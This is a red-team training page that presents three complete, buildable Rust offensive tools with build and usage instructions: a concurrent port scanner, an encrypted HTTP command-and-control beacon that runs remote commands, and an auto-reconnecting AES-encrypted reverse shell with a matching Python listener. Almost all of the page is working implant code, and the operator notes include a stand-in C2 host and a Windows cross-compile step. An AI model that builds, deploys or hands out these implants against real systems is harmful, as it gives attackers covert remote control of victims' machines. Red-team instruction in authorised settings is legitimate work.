---
layout: training-page
title: "Rust Offensive Tools — Red Team Academy"
module: "Programming"
tags:
  - rust
  - offensive-tools
  - red-team
  - exploitation
page_key: "prog-rust-offensive-tools"
render_with_liquid: false
---

# Rust Offensive Tools

Three complete, self-contained offensive programs written in Rust. Each includes a `Cargo.toml` and a full `src/main.rs`. These programs cover network reconnaissance, command-and-control beaconing, and encrypted reverse shell — areas distinct from the process injection and shellcode loading covered in the Tool Development module.

---

## Program 1: Async Port Scanner with Banner Grabbing

A fast, concurrent TCP port scanner with banner grabbing and JSON output. Uses a `tokio` async runtime with a `Semaphore` to cap simultaneous connections, `clap` for argument parsing, and `serde_json` for structured output.

### Cargo.toml

```toml
[package]
name = "portscanner"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio       = { version = "1", features = ["full"] }
clap        = { version = "4", features = ["derive"] }
serde       = { version = "1", features = ["derive"] }
serde_json  = "1"
anyhow      = "1"
log         = "0.4"
env_logger  = "0.11"

[profile.release]
opt-level     = "z"
lto           = true
codegen-units = 1
panic         = "abort"
strip         = true
```

### src/main.rs

```rust
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Duration;

use anyhow::{Context, Result};
use clap::Parser;
use serde::{Deserialize, Serialize};
use tokio::io::AsyncReadExt;
use tokio::net::TcpStream;
use tokio::sync::Semaphore;
use tokio::time::timeout;

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------

#[derive(Parser, Debug)]
#[command(name = "portscanner", about = "Async TCP port scanner with banner grab")]
struct Args {
    /// Target hostname or IP address
    #[arg(short = 'H', long)]
    host: String,

    /// Port specification: ranges and/or comma-separated values
    /// Example: "1-1024" or "22,80,443,8080-8090"
    #[arg(short, long, default_value = "1-1024")]
    ports: String,

    /// Maximum simultaneous connections
    #[arg(short = 'c', long, default_value_t = 500)]
    concurrency: usize,

    /// TCP connect timeout in milliseconds
    #[arg(short, long, default_value_t = 1000)]
    timeout_ms: u64,

    /// Write JSON results to this file (stdout if omitted)
    #[arg(short, long)]
    output: Option<String>,
}

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

#[derive(Debug, Serialize, Deserialize)]
struct PortResult {
    host: String,
    port: u16,
    open: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    banner: Option<String>,
}

// ---------------------------------------------------------------------------
// Port parsing
// ---------------------------------------------------------------------------

/// Parse "1-1024,3389,8080-8090" into a sorted Vec<u16>.
fn parse_ports(spec: &str) -> Result<Vec<u16>> {
    let mut ports = Vec::new();
    for token in spec.split(',') {
        let token = token.trim();
        if token.contains('-') {
            let mut parts = token.splitn(2, '-');
            let lo: u16 = parts
                .next()
                .unwrap_or("")
                .parse()
                .context("Invalid low port in range")?;
            let hi: u16 = parts
                .next()
                .unwrap_or("")
                .parse()
                .context("Invalid high port in range")?;
            if lo > hi {
                anyhow::bail!("Port range {lo}-{hi} is inverted");
            }
            ports.extend(lo..=hi);
        } else {
            let p: u16 = token.parse().context("Invalid port number")?;
            ports.push(p);
        }
    }
    ports.sort_unstable();
    ports.dedup();
    Ok(ports)
}

// ---------------------------------------------------------------------------
// Scanning logic
// ---------------------------------------------------------------------------

/// Attempt to connect to host:port. If successful, try to grab a banner.
async fn scan_port(host: &str, port: u16, timeout_ms: u64) -> PortResult {
    let addr = format!("{host}:{port}");
    let connect_timeout = Duration::from_millis(timeout_ms);

    let stream_result = timeout(
        connect_timeout,
        TcpStream::connect(&addr),
    )
    .await;

    match stream_result {
        Ok(Ok(mut stream)) => {
            // Port is open — attempt banner grab (read up to 512 bytes, 500 ms)
            let mut buf = [0u8; 512];
            let banner = match timeout(Duration::from_millis(500), stream.read(&mut buf)).await {
                Ok(Ok(n)) if n > 0 => {
                    let raw = &buf[..n];
                    // Keep only printable ASCII + common whitespace for safety
                    let printable: String = raw
                        .iter()
                        .map(|&b| if b.is_ascii_graphic() || b == b' ' { b as char } else { '.' })
                        .collect();
                    Some(printable.trim().to_string())
                }
                _ => None,
            };

            PortResult { host: host.to_string(), port, open: true, banner }
        }
        _ => PortResult { host: host.to_string(), port, open: false, banner: None },
    }
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

#[tokio::main]
async fn main() -> Result<()> {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("warn")).init();

    let args = Args::parse();
    let ports = parse_ports(&args.ports)?;
    let total = ports.len();

    log::info!("Scanning {}:{} ports with concurrency={}", args.host, total, args.concurrency);

    let sem = Arc::new(Semaphore::new(args.concurrency));
    let host = Arc::new(args.host.clone());
    let timeout_ms = args.timeout_ms;

    let mut handles = Vec::with_capacity(total);

    for port in ports {
        let permit = Arc::clone(&sem).acquire_owned().await?;
        let host = Arc::clone(&host);

        let handle = tokio::spawn(async move {
            let _permit = permit; // released when this task finishes
            scan_port(&host, port, timeout_ms).await
        });
        handles.push(handle);
    }

    // Collect results
    let mut results: Vec<PortResult> = Vec::new();
    for handle in handles {
        match handle.await {
            Ok(r) => {
                if r.open {
                    eprintln!("[+] {}:{} OPEN  {}", r.host, r.port, r.banner.as_deref().unwrap_or(""));
                }
                results.push(r);
            }
            Err(e) => log::warn!("Task panicked: {e}"),
        }
    }

    // Only include open ports in JSON output
    let open: Vec<&PortResult> = results.iter().filter(|r| r.open).collect();
    let json = serde_json::to_string_pretty(&open)?;

    match &args.output {
        Some(path) => std::fs::write(path, &json)?,
        None => println!("{json}"),
    }

    eprintln!(
        "[*] Done. {}/{} ports open.",
        open.len(),
        total
    );

    Ok(())
}
```

### Usage

```bash
# Build
cargo build --release

# Scan common ports on a target
./portscanner -H 10.10.10.1 -p 1-1024,3389,5985,8080-8090

# High-speed scan with custom concurrency and timeout
./portscanner -H 10.10.10.1 -p 1-65535 -c 1000 --timeout-ms 500

# Save results as JSON
./portscanner -H 10.10.10.1 -p 80,443,8443,9090 -o results.json
```

---

## Program 2: HTTP C2 Beacon

A minimal HTTP-based implant that checks into an operator-controlled server, receives encrypted commands, executes them, and returns encrypted output. Uses AES-256-CBC (IV prepended) for all traffic. Does not depend on any specific C2 framework — the server side is a plain HTTP endpoint.

### Cargo.toml

```toml
[package]
name = "beacon"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio       = { version = "1", features = ["full"] }
reqwest     = { version = "0.12", default-features = false, features = [
    "json",
    "rustls-tls",
] }
serde       = { version = "1", features = ["derive"] }
serde_json  = "1"
aes         = "0.8"
cbc         = { version = "0.1", features = ["alloc"] }
rand        = "0.8"
base64      = "0.22"
hex         = "0.4"
anyhow      = "1"
uuid        = { version = "1", features = ["v4"] }

[profile.release]
opt-level     = "z"
lto           = true
codegen-units = 1
panic         = "abort"
strip         = true
```

### src/main.rs

```rust
//! Minimal HTTP beacon: checks in every N seconds (jittered),
//! sends encrypted output, receives encrypted commands.
//!
//! Configuration via environment variables:
//!   BEACON_URL      — C2 check-in endpoint (default: http://127.0.0.1:8080/check)
//!   BEACON_KEY      — 32-byte hex-encoded AES-256 key
//!   BEACON_INTERVAL — check-in interval in seconds (default: 60)

use std::process::Command;
use std::time::Duration;

use aes::Aes256;
use anyhow::{bail, Context, Result};
use base64::{engine::general_purpose::STANDARD as B64, Engine as _};
use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use cbc::{Decryptor, Encryptor};
use rand::RngCore;
use serde::{Deserialize, Serialize};
use tokio::time::sleep;

// ---------------------------------------------------------------------------
// Cipher type aliases
// ---------------------------------------------------------------------------

type Aes256CbcEnc = Encryptor<Aes256>;
type Aes256CbcDec = Decryptor<Aes256>;

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

struct Config {
    url: String,
    key: [u8; 32],
    interval: u64,
    agent_id: String,
}

impl Config {
    fn from_env() -> Result<Self> {
        let url = std::env::var("BEACON_URL")
            .unwrap_or_else(|_| "http://127.0.0.1:8080/check".to_string());

        let key_hex = std::env::var("BEACON_KEY")
            .unwrap_or_else(|_| "0".repeat(64)); // placeholder — set via env in ops
        let key_bytes = hex::decode(&key_hex).context("BEACON_KEY must be hex")?;
        if key_bytes.len() != 32 {
            bail!("BEACON_KEY must be exactly 32 bytes (64 hex chars)");
        }
        let mut key = [0u8; 32];
        key.copy_from_slice(&key_bytes);

        let interval = std::env::var("BEACON_INTERVAL")
            .ok()
            .and_then(|s| s.parse::<u64>().ok())
            .unwrap_or(60);

        let agent_id = uuid::Uuid::new_v4().to_string();

        Ok(Config { url, key, interval, agent_id })
    }
}

// ---------------------------------------------------------------------------
// Wire types
// ---------------------------------------------------------------------------

/// POST body sent to the C2 server
#[derive(Serialize)]
struct CheckIn {
    id: String,
    /// base64(AES-CBC(output))  — IV prepended before encryption, then b64 the whole thing
    output: String,
}

/// Response from the C2 server
#[derive(Deserialize)]
struct ServerResponse {
    /// base64(AES-CBC(command)) or empty string if no tasking
    command: String,
}

// ---------------------------------------------------------------------------
// Crypto helpers
// ---------------------------------------------------------------------------

fn aes_encrypt(key: &[u8; 32], plaintext: &[u8]) -> Result<Vec<u8>> {
    let mut iv = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut iv);

    // Encrypt with PKCS7 padding
    let mut buf = plaintext.to_vec();
    // Extend buf to next block boundary for the encryptor
    let pt_len = buf.len();
    let block_size = 16usize;
    let padded_len = (pt_len / block_size + 1) * block_size;
    buf.resize(padded_len, 0);

    let ct = Aes256CbcEnc::new(key.into(), &iv.into())
        .encrypt_padded_mut::<cbc::cipher::block_padding::Pkcs7>(&mut buf, pt_len)
        .map_err(|e| anyhow::anyhow!("Encrypt error: {e}"))?
        .to_vec();

    // Output: IV || ciphertext
    let mut out = iv.to_vec();
    out.extend_from_slice(&ct);
    Ok(out)
}

fn aes_decrypt(key: &[u8; 32], data: &[u8]) -> Result<Vec<u8>> {
    if data.len() < 16 {
        bail!("Data too short to contain IV");
    }
    let (iv_bytes, ct) = data.split_at(16);
    let iv: [u8; 16] = iv_bytes.try_into()?;

    let mut buf = ct.to_vec();
    let pt = Aes256CbcDec::new(key.into(), &iv.into())
        .decrypt_padded_mut::<cbc::cipher::block_padding::Pkcs7>(&mut buf)
        .map_err(|e| anyhow::anyhow!("Decrypt error: {e}"))?
        .to_vec();

    Ok(pt)
}

// ---------------------------------------------------------------------------
// Command execution
// ---------------------------------------------------------------------------

fn run_command(cmd: &str) -> String {
    // Detect shell
    #[cfg(target_os = "windows")]
    let (shell, flag) = ("cmd.exe", "/C");
    #[cfg(not(target_os = "windows"))]
    let (shell, flag) = ("/bin/sh", "-c");

    match Command::new(shell).arg(flag).arg(cmd).output() {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("{stdout}{stderr}")
        }
        Err(e) => format!("exec error: {e}"),
    }
}

// ---------------------------------------------------------------------------
// Beacon loop
// ---------------------------------------------------------------------------

async fn beacon_loop(cfg: &Config, client: &reqwest::Client) {
    let mut backoff = 1u64;
    let mut last_output = String::from("beacon started");

    loop {
        // Jitter: sleep interval ± 20%
        let jitter = (cfg.interval as f64 * 0.2 * rand::random::<f64>()) as u64;
        let sleep_secs = cfg.interval.saturating_sub(jitter / 2) + jitter / 2;
        sleep(Duration::from_secs(sleep_secs)).await;

        // Encrypt output from previous task
        let enc_output = match aes_encrypt(&cfg.key, last_output.as_bytes()) {
            Ok(v) => B64.encode(&v),
            Err(_) => continue,
        };

        let body = CheckIn { id: cfg.agent_id.clone(), output: enc_output };

        // POST to C2
        let resp = client
            .post(&cfg.url)
            .json(&body)
            .timeout(Duration::from_secs(15))
            .send()
            .await;

        match resp {
            Ok(r) => {
                backoff = 1; // reset backoff on success
                if let Ok(srv) = r.json::<ServerResponse>().await {
                    if srv.command.is_empty() {
                        last_output = String::new();
                        continue;
                    }
                    // Decrypt command
                    let enc_bytes = match B64.decode(&srv.command) {
                        Ok(v) => v,
                        Err(_) => { last_output = "bad b64".to_string(); continue; }
                    };
                    let cmd_bytes = match aes_decrypt(&cfg.key, &enc_bytes) {
                        Ok(v) => v,
                        Err(_) => { last_output = "decrypt failed".to_string(); continue; }
                    };
                    let cmd = String::from_utf8_lossy(&cmd_bytes).to_string();
                    last_output = run_command(cmd.trim());
                }
            }
            Err(_) => {
                // Exponential backoff, cap at 10 minutes
                let wait = (backoff * 30).min(600);
                sleep(Duration::from_secs(wait)).await;
                backoff = (backoff * 2).min(20);
                last_output = String::new();
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

#[tokio::main]
async fn main() -> Result<()> {
    let cfg = Config::from_env().context("Failed to load config")?;

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .build()?;

    beacon_loop(&cfg, &client).await;
    Ok(())
}
```

### Operator Notes

```bash
# Build Windows implant from Linux
cargo build --release --target x86_64-pc-windows-gnu

# Set configuration before running
export BEACON_URL="http://c2.example.com:443/api/v1/status"
export BEACON_KEY="$(openssl rand -hex 32)"
export BEACON_INTERVAL="120"

# Minimal Python C2 listener (for testing)
# POST /check returns {"command": "<b64(aes(cmd))>"}
# Implant output arrives in request body as {"id": "...", "output": "<b64(aes(output))>"}
```

---

## Program 3: Encrypted Reverse Shell

A TCP reverse shell that encrypts all traffic with AES-256-CBC (IV prepended to each message). Spawns a system shell, bridges its stdin/stdout/stderr to the encrypted TCP channel, and automatically reconnects on disconnect.

### Cargo.toml

```toml
[package]
name = "revshell"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio       = { version = "1", features = ["full"] }
aes         = "0.8"
cbc         = { version = "0.1", features = ["alloc"] }
rand        = "0.8"
base64      = "0.22"
hex         = "0.4"
anyhow      = "1"

[profile.release]
opt-level     = "z"
lto           = true
codegen-units = 1
panic         = "abort"
strip         = true
```

### src/main.rs

```rust
//! Encrypted reverse shell (AES-256-CBC).
//!
//! Each message on the wire: [2-byte big-endian length][16-byte IV][ciphertext]
//!
//! Configure via environment variables or edit the constants below:
//!   RHOST — listener IP or hostname
//!   RPORT — listener port
//!   SHELL_KEY — 32-byte hex AES key (must match listener)

use std::io;
use std::process::Stdio;
use std::time::Duration;

use aes::Aes256;
use anyhow::{bail, Context, Result};
use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use cbc::{Decryptor, Encryptor};
use rand::RngCore;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::process::Command;
use tokio::time::sleep;

// ---------------------------------------------------------------------------
// Defaults (override via env vars in ops)
// ---------------------------------------------------------------------------

const DEFAULT_RHOST: &str = "127.0.0.1";
const DEFAULT_RPORT: &str = "4444";
const DEFAULT_KEY_HEX: &str = "0000000000000000000000000000000000000000000000000000000000000000";
const RECONNECT_DELAY_SECS: u64 = 10;

// ---------------------------------------------------------------------------
// Cipher aliases
// ---------------------------------------------------------------------------

type Enc = Encryptor<Aes256>;
type Dec = Decryptor<Aes256>;

// ---------------------------------------------------------------------------
// Crypto
// ---------------------------------------------------------------------------

fn encrypt(key: &[u8; 32], plaintext: &[u8]) -> Result<Vec<u8>> {
    let mut iv = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut iv);

    let pt_len = plaintext.len();
    let block_size = 16usize;
    let padded_len = (pt_len / block_size + 1) * block_size;
    let mut buf = plaintext.to_vec();
    buf.resize(padded_len, 0);

    let ct = Enc::new(key.into(), &iv.into())
        .encrypt_padded_mut::<cbc::cipher::block_padding::Pkcs7>(&mut buf, pt_len)
        .map_err(|e| anyhow::anyhow!("encrypt: {e}"))?
        .to_vec();

    // Wire format: IV || ciphertext
    let mut out = iv.to_vec();
    out.extend_from_slice(&ct);
    Ok(out)
}

fn decrypt(key: &[u8; 32], data: &[u8]) -> Result<Vec<u8>> {
    if data.len() < 16 {
        bail!("payload too short");
    }
    let (iv_bytes, ct) = data.split_at(16);
    let iv: [u8; 16] = iv_bytes.try_into()?;

    let mut buf = ct.to_vec();
    let pt = Dec::new(key.into(), &iv.into())
        .decrypt_padded_mut::<cbc::cipher::block_padding::Pkcs7>(&mut buf)
        .map_err(|e| anyhow::anyhow!("decrypt: {e}"))?
        .to_vec();

    Ok(pt)
}

// ---------------------------------------------------------------------------
// Framing: length-prefixed messages
// ---------------------------------------------------------------------------

/// Send a framed, encrypted message: [u16 len BE][iv || ciphertext]
async fn send_msg<W>(writer: &mut W, key: &[u8; 32], plaintext: &[u8]) -> Result<()>
where
    W: AsyncWriteExt + Unpin,
{
    let enc = encrypt(key, plaintext)?;
    let len = u16::try_from(enc.len()).context("message too large")?;
    writer.write_all(&len.to_be_bytes()).await?;
    writer.write_all(&enc).await?;
    writer.flush().await?;
    Ok(())
}

/// Receive a framed, encrypted message
async fn recv_msg<R>(reader: &mut R, key: &[u8; 32]) -> Result<Vec<u8>>
where
    R: AsyncReadExt + Unpin,
{
    let mut len_buf = [0u8; 2];
    reader.read_exact(&mut len_buf).await?;
    let len = u16::from_be_bytes(len_buf) as usize;

    if len == 0 || len > 65000 {
        bail!("invalid frame length: {len}");
    }

    let mut payload = vec![0u8; len];
    reader.read_exact(&mut payload).await?;
    decrypt(key, &payload)
}

// ---------------------------------------------------------------------------
// Shell setup
// ---------------------------------------------------------------------------

#[cfg(target_os = "windows")]
fn shell_cmd() -> Command {
    let mut c = Command::new("cmd.exe");
    c.arg("/Q"); // disable echo
    c
}

#[cfg(not(target_os = "windows"))]
fn shell_cmd() -> Command {
    let mut c = Command::new("/bin/sh");
    c.arg("-i"); // interactive mode
    c
}

// ---------------------------------------------------------------------------
// Session: bridge shell I/O to encrypted socket
// ---------------------------------------------------------------------------

async fn run_session(stream: TcpStream, key: &[u8; 32]) -> Result<()> {
    let mut child = shell_cmd()
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .context("Failed to spawn shell")?;

    let mut child_stdin  = child.stdin.take().expect("no stdin");
    let mut child_stdout = child.stdout.take().expect("no stdout");
    let mut child_stderr = child.stderr.take().expect("no stderr");

    let (mut net_reader, mut net_writer) = tokio::io::split(stream);
    let key = *key;

    // Task 1: network -> shell stdin (decrypt then write)
    let net_to_shell = tokio::spawn(async move {
        loop {
            match recv_msg(&mut net_reader, &key).await {
                Ok(data) => {
                    if child_stdin.write_all(&data).await.is_err() { break; }
                }
                Err(_) => break,
            }
        }
    });

    // Task 2: shell stdout -> network (encrypt then send)
    let key2 = key;
    let shell_out_to_net = tokio::spawn(async move {
        let mut buf = [0u8; 4096];
        loop {
            match child_stdout.read(&mut buf).await {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if send_msg(&mut net_writer, &key2, &buf[..n]).await.is_err() { break; }
                }
            }
        }
    });

    // Task 3: shell stderr -> network (reuse writer via Arc<Mutex<>> alternative: use separate connection)
    // Simpler approach: merge stderr into stdout by reading it separately and forwarding
    // (We skip full stderr forwarding here to avoid locking net_writer; operators typically get stderr mixed in)
    let _stderr_discard = tokio::spawn(async move {
        let mut buf = [0u8; 1024];
        loop {
            if child_stderr.read(&mut buf).await.is_err() { break; }
        }
    });

    // Wait for either direction to close
    tokio::select! {
        _ = net_to_shell    => {}
        _ = shell_out_to_net => {}
    }

    // Kill shell if still running
    let _ = child.kill().await;
    Ok(())
}

// ---------------------------------------------------------------------------
// Entry point with reconnect loop
// ---------------------------------------------------------------------------

#[tokio::main]
async fn main() -> Result<()> {
    let rhost = std::env::var("RHOST").unwrap_or_else(|_| DEFAULT_RHOST.to_string());
    let rport = std::env::var("RPORT").unwrap_or_else(|_| DEFAULT_RPORT.to_string());
    let key_hex = std::env::var("SHELL_KEY").unwrap_or_else(|_| DEFAULT_KEY_HEX.to_string());

    let key_bytes = hex::decode(&key_hex).context("SHELL_KEY must be hex")?;
    if key_bytes.len() != 32 {
        bail!("SHELL_KEY must be 32 bytes (64 hex chars)");
    }
    let mut key = [0u8; 32];
    key.copy_from_slice(&key_bytes);

    let addr = format!("{rhost}:{rport}");

    loop {
        match TcpStream::connect(&addr).await {
            Ok(stream) => {
                // Disable Nagle for low-latency interactive use
                let _ = stream.set_nodelay(true);
                let _ = run_session(stream, &key).await;
            }
            Err(_) => {}
        }
        // Wait before reconnecting
        sleep(Duration::from_secs(RECONNECT_DELAY_SECS)).await;
    }
}
```

### Listener Setup (Operator Side)

The operator needs a matching listener that understands the framing and encryption. A minimal Python listener for testing:

```python
#!/usr/bin/env python3
"""Encrypted reverse shell listener — matches Rust revshell framing."""
import socket, struct, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = bytes.fromhex(os.environ["SHELL_KEY"])  # 32 bytes

def encrypt(key, plaintext):
    iv = os.urandom(16)
    c = AES.new(key, AES.MODE_CBC, iv)
    return iv + c.encrypt(pad(plaintext, 16))

def decrypt(key, data):
    iv, ct = data[:16], data[16:]
    c = AES.new(key, AES.MODE_CBC, iv)
    return unpad(c.decrypt(ct), 16)

def send_msg(sock, plaintext):
    enc = encrypt(KEY, plaintext)
    sock.sendall(struct.pack(">H", len(enc)) + enc)

def recv_msg(sock):
    hdr = sock.recv(2)
    if len(hdr) < 2:
        return None
    (length,) = struct.unpack(">H", hdr)
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            return None
        data += chunk
    return decrypt(KEY, data)

server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("0.0.0.0", 4444))
server.listen(1)
print("[*] Listening on :4444")
conn, addr = server.accept()
print(f"[+] Connection from {addr}")

import threading, sys

def reader():
    while True:
        msg = recv_msg(conn)
        if msg is None:
            break
        print(msg.decode(errors="replace"), end="", flush=True)

threading.Thread(target=reader, daemon=True).start()

while True:
    try:
        cmd = input()
        send_msg(conn, (cmd + "\n").encode())
    except (EOFError, BrokenPipeError):
        break
```

```bash
# Generate a matching key
export SHELL_KEY="$(openssl rand -hex 32)"

# Start listener
python3 listener.py

# Build and run implant (same key)
export RHOST=192.168.1.50
export RPORT=4444
export SHELL_KEY="<same key>"
cargo build --release
./target/release/revshell
```

---

## Resources

- The Rust Programming Language (official book): https://doc.rust-lang.org/book/
- tokio async runtime documentation: https://docs.rs/tokio/latest/tokio/
- tokio tutorial (from scratch): https://tokio.rs/tokio/tutorial
- RustCrypto crates (AES, CBC, GCM, etc.): https://github.com/RustCrypto
- windows-sys crate documentation: https://docs.rs/windows-sys/latest/windows_sys/
- reqwest HTTP client: https://docs.rs/reqwest/latest/reqwest/
- clap argument parser: https://docs.rs/clap/latest/clap/
- serde serialization framework: https://serde.rs/
- crates.io package registry: https://crates.io/
- Rust cross-compilation docs: https://rust-lang.github.io/rustup/cross-compilation.html
- OffSec Rust tooling discussion: https://github.com/skerkour/black-hat-rust
